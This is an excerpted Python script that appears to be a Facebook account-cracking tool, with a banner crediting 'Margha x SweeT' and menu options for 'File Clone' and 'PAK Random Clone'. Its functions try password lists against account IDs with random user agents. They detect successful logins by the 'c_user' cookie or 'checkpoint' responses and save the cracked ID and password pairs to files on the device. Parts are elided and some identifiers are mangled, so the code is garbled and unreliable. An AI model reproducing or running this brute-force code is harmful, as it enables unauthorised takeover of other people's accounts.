...
try:
	...
	os.system('python Margha+SweeT.py')
...
\x1b[1;92m   __  __               _         
 ...
 |_|  |_\__,_|_| \__, |_||_\__,_|
                 |___/  
--------------------------------------------------
>>  Owner    : Margha x SweeT oo
>>  Facebook : SweeT oo FB KiNg
>>  Version  : 1.1
>>  Team❤    : Margha LoFara
--------------------------------------------------""")
def linex():
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> Margha/JXB TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			print('[1]  File Clone\n[2] PAK Random Clone\n[0] Exit')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Margha+SweeT.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Margha+SweeT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in Margha+SweeT:
				print('\r\r\033[1;31m[Margha+SweeT-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/Margha+SweeT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Margha+SweeT:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Margha+SweeT-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Margha+SweeT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Margha+SweeT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in Margha+SweeT:
				...
				print('\r\r\033[1;32m[Margha+SweeT-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Margha+SweeT-OK] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMargha+SweeT\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Margha+SweeT-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Margha+SweeT-OK] '+cid+' | '+ps+'\33[0;97m')
